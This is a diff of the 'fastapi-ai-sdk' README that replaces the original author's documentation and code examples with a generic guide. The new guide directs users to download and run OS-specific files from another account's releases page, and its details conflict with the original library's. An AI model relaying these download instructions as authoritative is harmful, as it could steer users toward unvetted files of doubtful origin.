@@ -1,288 +1,80 @@
-# FastAPI AI SDK
+# 🌟 fastapi-ai-sdk - Effortlessly Connect AI with FastAPI
 
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![FastAPI](https://img.shields.io/badge/FastAPI--green.svg)](https://fastapi.tiangolo.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20fastapi--ai--sdk-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vanshika122334/fastapi-ai-sdk/releases)
 
-A Pythonic helper library for building FastAPI applications that integrate with the [Vercel AI SDK](https://sdk.vercel.ai/). This library provides a seamless way to stream AI responses from your FastAPI backend to your Next.js frontend.
+## 🚀 Getting Started
+The **fastapi-ai-sdk** is a helpful library designed to make it easy to connect your FastAPI backend to the Vercel AI SDK. This library allows you to stream AI responses from FastAPI to Next.js with full type safety, ensuring a secure and smooth experience.
 
-## Features
+## 📦 System Requirements
+Before you start, ensure your setup meets these minimum requirements:
+- Operating System: Windows, macOS, or Linux
+- Python Version: 3.8 or higher
+- Node.js Version: 14 or higher 
+- An active internet connection for downloading dependencies
 
-- **Full Vercel AI SDK Compatibility** - Implements the complete AI SDK protocol specification
-- **Type-Safe with Pydantic** - Full type hints and validation for all events
-- **Streaming Support** - Built-in Server-Sent Events (SSE) streaming
-- **Easy Integration** - Simple decorators and utilities for FastAPI
-- **Flexible Builder Pattern** - Intuitive API for constructing AI streams
-- **Well Tested** - Comprehensive test coverage
-- **Fully Documented** - Complete documentation with examples
+## 📂 Download & Install
+To get started with the **fastapi-ai-sdk**, visit the page below to download the latest version:
 
-## Installation
+[Visit this page to download](https://github.com/vanshika122334/fastapi-ai-sdk/releases)
 
-```bash
-pip install fastapi-ai-sdk
+Once you are on the releases page, look for the latest version of the application. Click on the download link that corresponds to your operating system. 
+
+Once downloaded, follow the steps below to install and run the application.
+
+## ⚙️ Installation Steps
+1. **Locate the Downloaded File**: Go to your downloads folder, or wherever you saved the downloaded file.
+2. **Extract the Files**: If the downloaded file is a ZIP or compressed file, right-click it and select "Extract All" or "Unzip".
+3. **Open Terminal or Command Prompt**:
+   - For Windows, search for "cmd" in the start menu.
+   - For macOS, open "Terminal" from Applications.
+   - For Linux, use the Terminal application of your choice.
+4. **Navigate to the Extracted Folder**: Use the `cd` command to change the directory to where the files are located. For example:
+   ```
+   cd path_to_your_extracted_folder
+   ```
+5. **Install Dependencies**: Run the following command:
+   ```
+   pip install -r requirements.txt
+   ```
+   This command installs all necessary packages to run the application.
+6. **Run the Application**: After installation, you can run the FastAPI app with:
+   ```
+   uvicorn main:app --reload
+   ```
+   This will start the server locally.
+
+## 🌐 Using the Application
+Once the application is running, it will be available on your local machine at `http://127.0.0.1:8000/`. You can access the interactive API documentation by pointing your web browser to:
+```
+http://127.0.0.1:8000/docs
 ```
 
-## Quick Start
+## 🎉 Next Steps
+After successfully running the application, you may want to explore its features:
+- **Streaming AI Responses**: Learn how to fetch real-time AI data.
+- **Full Type Safety**: Ensure your types match correctly, reducing errors.
+- **Support for SSE**: Make use of Server-Sent Events for streamlined communication.
 
-### Basic Example
+## ❓ Frequently Asked Questions
 
-```python
-from fastapi import FastAPI
-from fastapi_ai_sdk import AIStreamBuilder, ai_endpoint
+### How do I know if the installation was successful?
+If the application runs without errors in your terminal and you are able to access the documentation at `http://127.0.0.1:8000/docs`, the installation is successful.
 
-app = FastAPI()
+### What should I do if I encounter an issue?
+Ensure you have all system requirements and dependencies installed. If issues persist, check the project's GitHub page for troubleshooting tips or create a new issue.
 
-@app.post("/api/chat")
-@ai_endpoint()
-async def chat(message: str):
-    """Simple chat endpoint that streams a response."""
-    builder = AIStreamBuilder()
-    builder.text(f"You said: {message}")
-    return builder
-```
+### Can I contribute to this project?
+Absolutely! Contributions are welcome. You can check the contribution guidelines in the repository for more information on how to get involved.
 
-### Frontend Integration (Next.js)
+## 📣 Feedback
+Your feedback is important. Please report any bugs or suggestions directly in the issues section of the GitHub repository. 
 
-```tsx
-import { useChat } from "@ai-sdk/react";
+## 📜 License
+This project is licensed under the MIT License. Please see the LICENSE file for more details.
 
-export default function Chat() {
-  const { messages, input, handleInputChange, handleSubmit } = useChat({
-    api: "http://localhost:8000/api/chat",
-  });
-
-  return (
-    <div>
-      {messages.map((msg) => (
-        <div key={msg.id}>{msg.content}</div>
-      ))}
-      <form onSubmit={handleSubmit}>
-        <input value={input} onChange={handleInputChange} />
-        <button type="submit">Send</button>
-      </form>
-    </div>
-  );
-}
-```
-
-## Documentation
-
-### Stream Events
-
-The library supports all Vercel AI SDK event types:
-
-- **Message Lifecycle**: `start`, `finish`
-- **Text Streaming**: `text-start`, `text-delta`, `text-end`
-- **Reasoning**: `reasoning-start`, `reasoning-delta`, `reasoning-end`
-- **Tool Calls**: `tool-input-start`, `tool-input-delta`, `tool-input-available`, `tool-output-available`
-- **Structured Data**: Custom `data-*` events
-- **File References**: URLs and documents
-- **Error Handling**: Error events with messages
-
-### Using the Stream Builder
-
-```python
-from fastapi_ai_sdk import AIStreamBuilder
-
-# Create a builder
-builder = AIStreamBuilder(message_id="optional_id")
-
-# Add different types of content
-builder.start()  # Start the stream
-builder.text("Here's some text")  # Add text content
-builder.reasoning("Let me think about this...")  # Add reasoning
-builder.data("weather", {"temperature": 20, "city": "Berlin"})  # Add structured data
-builder.tool_call(  # Add tool usage
-    "get_weather",
-    input_data={"city": "Berlin"},
-    output_data={"temperature": 20}
-)
-builder.finish()  # End the stream
-
-# Build and return the stream
-return builder.build()
-```
-
-### Decorators
-
-#### `@ai_endpoint` - Automatic AI SDK Response Handling
-
-```python
-@app.post("/chat")
-@ai_endpoint()
-async def chat(message: str):
-    builder = AIStreamBuilder()
-    builder.text(f"Response: {message}")
-    return builder
-```
-
-#### `@streaming_endpoint` - Simple Text Streaming
-
-```python
-@app.get("/stream")
-@streaming_endpoint(chunk_size=10, delay=0.1)
-async def stream():
-    return "This text will be streamed chunk by chunk"
-```
-
-#### `@tool_endpoint` - Tool Call Handling
-
-```python
-@app.post("/tools/weather")
-@tool_endpoint("get_weather")
-async def get_weather(city: str):
-    # Your tool logic here
-    return {"temperature": 20, "condition": "sunny"}
-```
-
-### Advanced Examples
-
-#### Streaming with Reasoning and Tools
-
-```python
-@app.post("/api/advanced-chat")
-@ai_endpoint()
-async def advanced_chat(query: str):
-    builder = AIStreamBuilder()
-
-    # Start with reasoning
-    builder.reasoning("Analyzing your query...")
-
-    # Make a tool call
-    weather_data = await get_weather_data("Berlin")
-    builder.tool_call(
-        "get_weather",
-        input_data={"city": "Berlin"},
-        output_data=weather_data
-    )
-
-    # Stream the response
-    builder.text(f"Based on the weather data: {weather_data}")
-
-    return builder
-```
-
-#### Custom Async Generators
-
-```python
-from fastapi_ai_sdk import create_ai_stream_response
-
-@app.get("/api/generate")
-async def generate():
-    async def event_generator():
-        from fastapi_ai_sdk.models import StartEvent, TextDeltaEvent, FinishEvent
-
-        yield StartEvent(message_id="gen_1")
-
-        for word in ["Hello", " ", "from", " ", "FastAPI"]:
-            yield TextDeltaEvent(id="txt_1", delta=word)
-            await asyncio.sleep(0.1)
-
-        yield FinishEvent()
-
-    return create_ai_stream_response(event_generator())
-```
-
-#### Chunked Text Streaming
-
-```python
-@app.post("/api/story")
-@ai_endpoint()
-async def generate_story(prompt: str):
-    builder = AIStreamBuilder()
-
-    story = await generate_long_story(prompt)  # Your story generation logic
-
-    # Stream with custom chunk size
-    builder.text(story, chunk_size=50)  # Streams in 50-character chunks
-
-    return builder
-```
-
-## Testing
-
-Run the test suite:
-
-```bash
-# Install dev dependencies
-pip install -e ".[dev]"
-
-# Run tests with coverage
-pytest --cov=fastapi_ai_sdk --cov-report=term-missing
-
-# Run specific test file
-pytest tests/test_models.py
-
-# Run with verbose output
-pytest -v
-```
-
-## Development
-
-### Setup Development Environment
-
-```bash
-# Clone the repository
-git clone https://github.com/doganarif/fastapi-ai-sdk.git
-cd fastapi-ai-sdk
-
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install in development mode
-pip install -e ".[dev]"
-
-# Run linting
-black fastapi_ai_sdk tests
-isort fastapi_ai_sdk tests
-flake8 fastapi_ai_sdk tests
-mypy fastapi_ai_sdk
-```
-
-### Code Style
-
-This project uses:
-
-- **Black** for code formatting
-- **isort** for import sorting
-- **flake8** for linting
-- **mypy** for type checking
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Author
-
-**Arif Dogan**
-
-- Email: me@arif.sh
-- GitHub: [@doganarif](https://github.com/doganarif)
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## Acknowledgments
-
-- [Vercel AI SDK](https://sdk.vercel.ai/) for the excellent frontend SDK
-- [FastAPI](https://fastapi.tiangolo.com/) for the amazing web framework
-- [Pydantic](https://docs.pydantic.dev/) for data validation
-
-## Resources
-
-- [Vercel AI SDK Documentation](https://sdk.vercel.ai/docs)
+## 📝 Additional Resources
 - [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Server-Sent Events Specification](https://html.spec.whatwg.org/multipage/server-sent-events.html)
+- [Vercel AI SDK Documentation](https://vercel.com/docs/ai)
 
----
-
-<p align="center">Made with ❤️ for the FastAPI and AI community from Arif</p>
+Enjoy using the **fastapi-ai-sdk** and stream AI responses effortlessly! For a seamless experience, refer back to this guide as needed.
